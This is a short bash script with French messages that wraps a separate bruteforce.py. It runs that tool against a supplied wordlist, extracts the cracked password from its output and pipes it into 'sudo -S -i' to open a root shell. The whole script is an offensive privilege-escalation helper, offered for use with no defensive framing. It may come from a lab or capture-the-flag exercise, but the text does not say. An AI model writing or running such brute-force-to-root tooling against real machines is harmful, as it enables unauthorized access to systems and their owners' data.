#!/bin/bash

[ -z "$1" ] && echo "❌ Usage: $0 <wordlist>" && exit 1
[ ! -f "$1" ] && echo "❌ Wordlist $1 non trouvé" && exit 1

echo "🔍 Bruteforce en cours..."
echo "📁 Wordlist: $1"
echo ""

# Exécuter et capturer le mot de passe directement
password=$(python3 -u bruteforce.py --wordlist "$1" | grep -e "trouvé" | awk '{print $7}')
if [ -n "$password" ]; then
    pass=$password
    echo ""
    echo "🎉 MOT DE PASSE TROUVÉ: $pass"
    echo "🐚 Ouverture du shell root..."
    echo ""
    echo "$pass" | sudo -S -i < /dev/tty
fi
